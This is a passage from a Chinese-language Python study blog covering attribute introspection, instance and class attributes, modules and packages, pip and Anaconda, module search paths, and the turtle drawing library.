class="line">&gt;&gt;&gt; setattr(obj, &#x27;y&#x27;, 19) # 设置一个属性&#x27;y&#x27;</span><br><span class="line">&gt;&gt;&gt; hasattr(obj, &#x27;y&#x27;) # 有属性&#x27;y&#x27;吗？</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; getattr(obj, &#x27;y&#x27;) # 获取属性&#x27;y&#x27;</span><br><span class="line">19</span><br><span class="line">&gt;&gt;&gt; obj.y # 获取属性&#x27;y&#x27;</span><br><span class="line">19</span><br></pre></td></tr></table></figure><p>如果试图获取不存在的属性，会抛出 AttributeError 的错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(obj, &#x27;z&#x27;) # 获取属性&#x27;z&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#x27;MyObject&#x27; object has no attribute &#x27;z&#x27;</span><br></pre></td></tr></table></figure><p>可以传入一个 default 参数，如果属性不存在，就返回默认值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(obj, &#x27;z&#x27;, 404) # 获取属性&#x27;z&#x27;，如果不存在，返回默认值404</span><br><span class="line">404</span><br></pre></td></tr></table></figure><p>也可以获得对象的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hasattr(obj, &#x27;power&#x27;) # 有属性&#x27;power&#x27;吗？</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; getattr(obj, &#x27;power&#x27;) # 获取属性&#x27;power&#x27;</span><br><span class="line">&lt;bound method MyObject.power of &lt;__main__.MyObject object at 0x10077a6a0&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; fn = getattr(obj, &#x27;power&#x27;) # 获取属性&#x27;power&#x27;并赋值到变量fn</span><br><span class="line">&gt;&gt;&gt; fn # fn指向obj.power</span><br><span class="line">&lt;bound method MyObject.power of &lt;__main__.MyObject object at 0x10077a6a0&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; fn() # 调用fn()与调用obj.power()是一样的</span><br><span class="line">81</span><br></pre></td></tr></table></figure><blockquote><p>小结</p></blockquote><p>通过内置的一系列函数，我们可以对任意一个 Python 对象进行剖析，拿到其内部的数据。要注意的是，只有在不知道对象信息的时候，我们才会去获取对象信息。如果可以直接写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum = obj.x + obj.y</span><br></pre></td></tr></table></figure><p>就不要写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum = getattr(obj, &#x27;x&#x27;) + getattr(obj, &#x27;y&#x27;)</span><br></pre></td></tr></table></figure><p>一个正确的用法的例子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def readImage(fp):</span><br><span class="line">    if hasattr(fp, &#x27;read&#x27;):</span><br><span class="line">        return readData(fp)</span><br><span class="line">    return None</span><br></pre></td></tr></table></figure><p>假设我们希望从文件流 fp 中读取图像，我们首先要判断该 fp 对象是否存在 read 方法，如果存在，则该对象是一个流，如果不存在，则无法读取。<code>hasattr()</code>就派上了用场。</p><p>请注意，在 Python 这类动态语言中，根据鸭子类型，有<code>read()</code>方法，不代表该 fp 对象就是一个文件流，它也可能是网络流，也可能是内存中的一个字节流，但只要<code>read()</code>方法返回的是有效的图像数据，就不影响读取图像的功能。</p><h2 id="6-5-实例属性和类属性"><a href="#6-5-实例属性和类属性" class="headerlink" title="6.5 实例属性和类属性"></a>6.5 实例属性和类属性</h2><p>由于 Python 是动态语言，根据类创建的实例可以任意绑定属性。</p><p>给实例绑定属性的方法是通过实例变量，或者通过<code>self</code>变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">s = Student(&#x27;Bob&#x27;)</span><br><span class="line">s.score = 90</span><br></pre></td></tr></table></figure><p>但是，如果<code>Student</code>类本身需要绑定一个属性呢？可以直接在 class 中定义属性，这种属性是类属性，归<code>Student</code>类所有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    name = &#x27;Student&#x27;</span><br></pre></td></tr></table></figure><p>当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到。来测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Student(object):</span><br><span class="line">...     name = &#x27;Student&#x27;</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; s = Student() # 创建实例s</span><br><span class="line">&gt;&gt;&gt; print(s.name) # 打印name属性，因为实例并没有name属性，所以会继续查找class的name属性</span><br><span class="line">Student</span><br><span class="line">&gt;&gt;&gt; print(Student.name) # 打印类的name属性</span><br><span class="line">Student</span><br><span class="line">&gt;&gt;&gt; s.name = &#x27;Michael&#x27; # 给实例绑定name属性</span><br><span class="line">&gt;&gt;&gt; print(s.name) # 由于实例属性优先级比类属性高，因此，它会屏蔽掉类的name属性</span><br><span class="line">Michael</span><br><span class="line">&gt;&gt;&gt; print(Student.name) # 但是类属性并未消失，用Student.name仍然可以访问</span><br><span class="line">Student</span><br><span class="line">&gt;&gt;&gt; del s.name # 如果删除实例的name属性</span><br><span class="line">&gt;&gt;&gt; print(s.name) # 再次调用s.name，由于实例的name属性没有找到，类的name属性就显示出来了</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><p>从上面的例子可以看出，在编写程序的时候，千万不要对实例属性和类属性使用相同的名字，因为相同名称的实例属性将屏蔽掉类属性，但是当你删除实例属性后，再使用相同的名称，访问到的将是类属性。</p><blockquote><p>小结：</p></blockquote><ul><li>实例属性属于各个实例所有，互不干扰；</li><li>类属性属于类所有，所有实例共享一个属性；</li><li>不要对实例属性和类属性使用相同的名字，否则将产生难以发现的错误。</li></ul><blockquote><p>练习：</p></blockquote><p>为了统计学生人数，可以给 Student 类增加一个类属性，每创建一个实例，该属性自动增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    count = 0</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.__name = name</span><br><span class="line">        Student.count += 1</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 测试:</span><br><span class="line">if Student.count != 0:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    bart = Student(&#x27;Bart&#x27;)</span><br><span class="line">    if Student.count != 1:</span><br><span class="line">        print(&#x27;测试失败!&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        lisa = Student(&#x27;Bart&#x27;)</span><br><span class="line">        if Student.count != 2:</span><br><span class="line">            print(&#x27;测试失败!&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;Students:&#x27;, Student.count)</span><br><span class="line">            print(&#x27;测试通过!&#x27;)</span><br></pre></td></tr></table></figure><p>测试结果：</p><p><img src="https://cos.gjcloak.xyz/pigo/202207201450604.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20200809084430141" title="image-20200809084430141"></p><h2 id="6-6-参考资料"><a href="#6-6-参考资料" class="headerlink" title="6.6 参考资料"></a>6.6 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017495723838528">廖雪峰 - Python 3.x - 面向对象编程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面向对象编程 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(五)·模块</title>
      <link href="/98.html"/>
      <url>/98.html</url>
      
        <content type="html"><![CDATA[<p>我们知道，一个文件里代码越来越长的时候，就会越来越不容易维护。</p><p>为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。在 Python 中，一个 .py 文件就称之为一个模块（Module）。</p><blockquote><p>? 使用模块有什么好处？</p></blockquote><ul><li>（1）最大的好处是大大提高了代码的可维护性。</li><li>（2）其次，编写代码不必从零开始。当一个模块编写完毕，就可以被其他地方引用。我们在编写程序的时候，也经常引用其他模块，包括 Python 内置的模块和来自第三方的模块。</li><li>（3）使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，</li><li>（4）因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。但是也要注意，尽量不要与内置函数名字冲突。点<a href="http://docs.python.org/3/library/functions.html">这里</a>查看Python的所有内置函数。</li></ul><p>你也许还想到，如果不同的人编写的模块名相同怎么办？为了避免模块名冲突，Python 又引入了按目录来组织模块的方法，称为包（Package）。</p><p>举个例子，一个<code>abc.py</code>的文件就是一个名字叫<code>abc</code>的模块，一个<code>xyz.py</code>的文件就是一个名字叫<code>xyz</code>的模块。</p><p>现在，假设我们的<code>abc</code>和<code>xyz</code>这两个模块名字与其他模块冲突了，于是我们可以通过包来组织模块，避免冲突。方法是选择一个顶层包名，比如<code>mycompany</code>，按照如下目录存放：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mycompany</span><br><span class="line">├─ __init__.py</span><br><span class="line">├─ abc.py</span><br><span class="line">└─ xyz.py</span><br></pre></td></tr></table></figure><p>引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，<code>abc.py</code>模块的名字就变成了<code>mycompany.abc</code>，类似的，<code>xyz.py</code>的模块名变成了<code>mycompany.xyz</code>。</p><p>请注意，每一个包目录下面都会有一个<code>__init__.py</code>的文件，这个文件是必须存在的，否则，Python 就把这个目录当成普通目录，而不是一个包。<code>__init__.py</code>可以是空文件，也可以有 Python 代码，因为<code>__init__.py</code>本身就是一个模块，而它的模块名就是<code>mycompany</code>。</p><p>类似的，可以有多级目录，组成多级层次的包结构。比如如下的目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mycompany</span><br><span class="line"> ├─ web</span><br><span class="line"> │  ├─ __init__.py</span><br><span class="line"> │  ├─ utils.py</span><br><span class="line"> │  └─ www.py</span><br><span class="line"> ├─ __init__.py</span><br><span class="line"> ├─ abc.py</span><br><span class="line"> └─ utils.py</span><br></pre></td></tr></table></figure><p>文件<code>www.py</code>的模块名就是<code>mycompany.web.www</code>，两个文件<code>utils.py</code>的模块名分别是<code>mycompany.utils</code>和<code>mycompany.web.utils</code>。</p><p>!&gt; 自己创建模块时要注意命名，不能和 Python 自带的模块名称冲突。例如，系统自带了 sys 模块，自己的模块就不可命名为 sys.py，否则将无法导入系统自带的 sys 模块。</p><blockquote><p>总结：</p></blockquote><p>模块是一组 Python 代码的集合，可以使用其他模块，也可以被其他模块使用。</p><p>创建自己的模块时，要注意：</p><ul><li>模块名要遵循 Python 变量命名规范，不要使用中文、特殊字符；</li><li>模块名不要和系统模块名冲突，最好先查看系统是否已存在该模块，检查方法是在 Python 交互环境执行<code>import abc</code>，若成功则说明系统存在此模块。</li></ul><h2 id="5-1-使用模块"><a href="#5-1-使用模块" class="headerlink" title="5.1 使用模块"></a>5.1 使用模块</h2><p>Python 本身就内置了很多非常有用的模块，只要安装完毕，这些模块就可以立刻使用。</p><p>我们以内建的<code>sys</code>模块为例，编写一个<code>hello</code>的模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">&#x27; a test module &#x27;</span><br><span class="line"></span><br><span class="line">__author__ = &#x27;WuGenQiang&#x27;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    args = sys.argv</span><br><span class="line">    if len(args)==1:</span><br><span class="line">        print(&#x27;Hello, world!&#x27;)</span><br><span class="line">    elif len(args)==2:</span><br><span class="line">        print(&#x27;Hello, %s!&#x27; % args[1])</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Too many arguments!&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p>第 1 行和第 2 行是标准注释，第 1 行注释可以让这个<code>hello.py</code>文件直接在 Unix&#x2F;Linux&#x2F;Mac 上运行，第 2 行注释表示 .py 文件本身使用标准 UTF-8 编码；</p><p>第 4 行是一个字符串，表示模块的文档注释，任何模块代码的第一个字符串都被视为模块的文档注释；</p><p>第 6 行使用<code>__author__</code>变量把作者写进去，这样当你公开源代码后别人就可以瞻仰你的大名；</p><p>以上就是 Python 模块的标准文件模板，当然也可以全部删掉不写，但是，按标准办事肯定没错。</p><p>后面开始就是真正的代码部分。</p><p>你可能注意到了，使用<code>sys</code>模块的第一步，就是导入该模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br></pre></td></tr></table></figure><p>导入<code>sys</code>模块后，我们就有了变量<code>sys</code>指向该模块，利用<code>sys</code>这个变量，就可以访问<code>sys</code>模块的所有功能。</p><p><code>sys</code>模块有一个<code>argv</code>变量，用 list 存储了命令行的所有参数。<code>argv</code>至少有一个元素，因为第一个参数永远是该 .py 文件的名称，例如：</p><p>运行<code>python3 hello.py</code>获得的<code>sys.argv</code>就是<code>[&#39;hello.py&#39;]</code>；</p><p>运行<code>python3 hello.py WuGenQiang</code>获得的<code>sys.argv</code>就是<code>[&#39;hello.py&#39;, &#39;WuGenQiang&#39;]</code>。</p><p>最后，注意到这两行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p>当我们在命令行运行<code>hello</code>模块文件时，Python 解释器把一个特殊变量<code>__name__</code>置为<code>__main__</code>，而如果在其他地方导入该<code>hello</code>模块时，<code>if</code>判断将失败，因此，这种<code>if</code>测试可以让一个模块通过命令行运行时执行一些额外的代码，最常见的就是运行测试。</p><p>我们可以用命令行运行<code>hello.py</code>看看效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 hello.py</span><br><span class="line">Hello, world!</span><br><span class="line">$ python hello.py WuGenQiang</span><br><span class="line">Hello, WuGenQiang!</span><br></pre></td></tr></table></figure><p>如果启动 Python 交互环境，再导入<code>hello</code>模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python 3.4.3 (v3.4.3:9b73f1c3e601, Feb 23 2015, 02:52:03) </span><br><span class="line">[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import hello</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>导入时，没有打印<code>Hello, word!</code>，因为没有执行<code>test()</code>函数。</p><p>调用<code>hello.test()</code>时，才能打印出<code>Hello, word!</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hello.test()</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><h3 id="5-1-1-作用域"><a href="#5-1-1-作用域" class="headerlink" title="5.1.1 作用域"></a>5.1.1 作用域</h3><p>在一个模块中，我们可能会定义很多函数和变量，但有的函数和变量我们希望给别人使用，有的函数和变量我们希望仅仅在模块内部使用。在 Python 中，是通过<code>_</code>前缀来实现的。</p><p>正常的函数和变量名是公开的（public），可以被直接引用，比如：<code>abc</code>，<code>x123</code>，<code>PI</code>等；</p><p>类似<code>__xxx__</code>这样的变量是特殊变量，可以被直接引用，但是有特殊用途，比如上面的<code>__author__</code>，<code>__name__</code>就是特殊变量，<code>hello</code>模块定义的文档注释也可以用特殊变量<code>__doc__</code>访问，我们自己的变量一般不要用这种变量名；</p><p>类似<code>_xxx</code>和<code>__xxx</code>这样的函数或变量就是非公开的（private），不应该被直接引用，比如<code>_abc</code>，<code>__abc</code>等；</p><p>之所以我们说，private 函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为 Python 并没有一种方法可以完全限制访问 private 函数或变量，但是，从编程习惯上不应该引用 private 函数或变量。</p><p>private 函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def _private_1(name):</span><br><span class="line">    return &#x27;Hello, %s&#x27; % name</span><br><span class="line"></span><br><span class="line">def _private_2(name):</span><br><span class="line">    return &#x27;Hi, %s&#x27; % name</span><br><span class="line"></span><br><span class="line">def greeting(name):</span><br><span class="line">    if len(name) &gt; 3:</span><br><span class="line">        return _private_1(name)</span><br><span class="line">    else:</span><br><span class="line">        return _private_2(name)</span><br></pre></td></tr></table></figure><p>我们在模块里公开<code>greeting()</code>函数，而把内部逻辑用 private 函数隐藏起来了，这样，调用<code>greeting()</code>函数不用关心内部的 private 函数细节，这也是一种非常有用的代码封装和抽象的方法，即：</p><p>外部不需要引用的函数全部定义成 private，只有外部需要引用的函数才定义为 public。</p><h2 id="5-2-安装第三方模块"><a href="#5-2-安装第三方模块" class="headerlink" title="5.2 安装第三方模块"></a>5.2 安装第三方模块</h2><p>在 Python 中，安装第三方模块，是通过包管理工具 pip 完成的。</p><p>在命令提示符窗口下尝试运行<code>pip</code>，如果 Windows 提示未找到命令，可以重新运行安装程序添加<code>pip</code>。</p><p>注意：Mac 或 Linux上有可能并存 Python 3.x 和 Python 2.x，因此对应的 pip 命令是<code>pip3</code>。</p><p>例如，我们要安装一个第三方库——Python Imaging Library，这是 Python 下非常强大的处理图像的工具库。不过，PIL 目前只支持到 Python 2.7，并且有年头没有更新了，因此，基于 PIL 的 Pillow 项目开发非常活跃，并且支持最新的 Python 3。</p><p>一般来说，第三方库都会在 Python 官方的<a href="https://pypi.python.org/">pypi.python.org</a>网站注册，要安装一个第三方库，必须先知道该库的名称，可以在官网或者 pypi 上搜索，比如 Pillow 的名称叫<a href="https://pypi.python.org/pypi/Pillow/">Pillow</a>，因此，安装 Pillow 的命令就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure><p>耐心等待下载并安装后，就可以使用 Pillow 了。</p><p><img src="https://cos.gjcloak.xyz/images01/20200720224716.png" alt="image-20200720224346246" title="image-20200720224346246"></p><h3 id="5-2-1-安装常用模块"><a href="#5-2-1-安装常用模块" class="headerlink" title="5.2.1 安装常用模块"></a>5.2.1 安装常用模块</h3><p>在使用 Python 时，我们经常需要用到很多第三方库，例如，上面提到的 Pillow，以及 MySQL 驱动程序，Web 框架 Flask，科学计算 Numpy 等。用 pip 一个一个安装费时费力，还需要考虑兼容性。我们推荐直接使用<a href="https://www.anaconda.com/">Anaconda</a>，这是一个基于 Python 的数据处理和科学计算平台，它已经内置了许多非常有用的第三方库，我们装上 Anaconda，就相当于把数十个第三方模块自动安装好了，非常简单易用。</p><p>可以从<a href="https://www.anaconda.com/download/">Anaconda官网</a>下载GUI安装包，安装包有 500~600M，所以需要耐心等待下载。下载后直接安装，Anaconda 会把系统 Path 中的 python 指向自己自带的 Python，并且，Anaconda 安装的第三方模块会安装在 Anaconda 自己的路径下，不影响系统已安装的 Python 目录。</p><p>安装好 Anaconda 后，重新打开命令行窗口，输入 python，可以看到 Anaconda 的信息：</p><p><img src="https://cos.gjcloak.xyz/images01/20200720225032.png" alt="image-20200720225025797" title="image-20200720225025797"></p><p>可以尝试直接<code>import numpy</code>等已安装的第三方模块。</p><h3 id="5-2-2-模块搜索路径"><a href="#5-2-2-模块搜索路径" class="headerlink" title="5.2.2 模块搜索路径"></a>5.2.2 模块搜索路径</h3><p>当我们试图加载一个模块时，Python 会在指定的路径下搜索对应的 .py 文件，如果找不到，就会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import mymodule</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">ImportError: No module named mymodule</span><br></pre></td></tr></table></figure><p>默认情况下，Python 解释器会搜索当前目录、所有已安装的内置模块和第三方模块，搜索路径存放在<code>sys</code>模块的<code>path</code>变量中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.path</span><br><span class="line">[&#x27;&#x27;, &#x27;/Library/Frameworks/Python.framework/Versions/3.6/lib/python36.zip&#x27;, &#x27;/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6&#x27;, ..., &#x27;/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages&#x27;]</span><br></pre></td></tr></table></figure><p>如果我们要添加自己的搜索目录，有两种方法：</p><p>一是直接修改<code>sys.path</code>，添加要搜索的目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.path.append(&#x27;/Users/michael/my_py_scripts&#x27;)</span><br></pre></td></tr></table></figure><p>这种方法是在运行时修改，运行结束后失效。</p><p>第二种方法是设置环境变量<code>PYTHONPATH</code>，该环境变量的内容会被自动添加到模块搜索路径中。设置方式与设置Path 环境变量类似。注意只需要添加你自己的搜索路径，Python 自己本身的搜索路径不受影响。</p><h2 id="5-3-标准库的使用"><a href="#5-3-标准库的使用" class="headerlink" title="5.3 标准库的使用"></a>5.3 标准库的使用</h2><p><strong>Python 计算生态 &#x3D; 标准库 + 第三方库</strong></p><ul><li>标准库：随解释器直接安装到操作系统中的功能模块。</li><li>第三方库：需要经过安装才能使用的功能模块。</li><li>库 Library、包 Package、模块 Module，统称模块</li></ul><h3 id="5-3-1-turtle-库"><a href="#5-3-1-turtle-库" class="headerlink" title="5.3.1 turtle 库"></a>5.3.1 turtle 库</h3><h4 id="①-实例：Python-蟒蛇绘制"><a href="#①-实例：Python-蟒蛇绘制" class="headerlink" title="① 实例：Python 蟒蛇绘制"></a>① 实例：Python 蟒蛇绘制</h4><blockquote><p>用程序绘制一条蟒蛇。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#PythonDraw.py</span><br><span class="line">import turtle</span><br><span class="line">turtle.setup(650,350,200,200)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.fd(-250)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pensize(25)</span><br><span class="line">turtle.pencolor(&quot;purple&quot;)</span><br><span class="line">turtle.seth(-40)</span><br><span class="line">for i in range(4):</span><br><span class="line">    turtle.circle(40,80)</span><br><span class="line">    turtle.circle(-40,80)</span><br><span class="line">turtle.circle(40,80/2)</span><br><span class="line">turtle.fd(40)</span><br><span class="line">turtle.circle(16,180)</span><br><span class="line">turtle.fd(40*2/3)</span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://cos.gjcloak.xyz/01/Sep-122-2020%2009-31-22.gif" alt="Sep-122-2020 09-31-22" title="Sep-122-2020 09-31-22"></p><blockquote><p>☎️ 拓展：</p></blockquote><p><code>import turtle</code> 是程序的关键，import 保留字引入了一个绘图库：turtle（海龟库）</p><h4 id="②-turtle-库基本介绍"><a href="#②-turtle-库基本介绍" class="headerlink" title="② turtle 库基本介绍"></a>② turtle 库基本介绍</h4><p>turtle 库是 turtle 绘图体系的 Python 实现。</p><ul><li>turtle 绘图体系：1969 年诞生，主要用于程序设计</li><li>Python 语言的标准库之一</li><li>入门级的图形绘制函数库</li></ul><h4 id="③-turtle-绘图窗体布局"><a href="#③-turtle-绘图窗体布局" class="headerlink" title="③ turtle 绘图窗体布局"></a>③ turtle 绘图窗体布局</h4><p>Turtle 的绘图窗体，是 turtle 的一个画布空间，最小单位是像素。</p><p><code>setup()</code>设置窗体的大小及位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">turtle.setup(width,height,startx,starty)</span><br></pre></td></tr></table></figure><p>其中，4 个参数中后两个可选。</p><p><img src="https://cos.gjcloak.xyz/01/image-20200922105804423.png" alt="窗体" title="窗体"></p><h4 id="④-turtle-空间坐标体系"><a href="#④-turtle-空间坐标体系" class="headerlink" title="④ turtle 空间坐标体系"></a>④ turtle 空间坐标体系</h4><p><img src="https://cos.gjcloak.xyz/01/image-20200922105911223.png" alt="坐标系" title="坐标系"></p><p><img src="https://cos.gjcloak.xyz/01/image-20200922110047817.png" alt="image-20200922110047817" title="image-20200922110047817"></p><p><img src="https://cos.gjcloak.xyz/01/image-20200922110214059.png" alt="这个好" title="这个好"></p><h4 id="⑤-turtle-角度坐标体系"><a href="#⑤-turtle-角度坐标体系" class="headerlink" title="⑤ turtle 角度坐标体系"></a>⑤ turtle 角度坐标体系</h4><p><img src="https://cos.gjcloak.xyz/01/image-20200922110403533.png" alt="image-20200922110403533" title="image-20200922110403533"></p><p>改变运行角度：</p><p><img src="https://cos.gjcloak.xyz/01/image-20200922110505608.png" alt="image-20200922110505608" title="image-20200922110505608"></p><blockquote><p>小例子：</p></blockquote><p><img src="https://cos.gjcloak.xyz/01/image-20200922110548219.png" alt="image-20200922110548219" title="image-20200922110548219"></p><h4 id="⑥-RGB-色彩体系"><a href="#⑥-RGB-色彩体系" class="headerlink" title="⑥ RGB 色彩体系"></a>⑥ RGB 色彩体系</h4><p>由三种颜色构成的万物色</p><ul><li>RGB 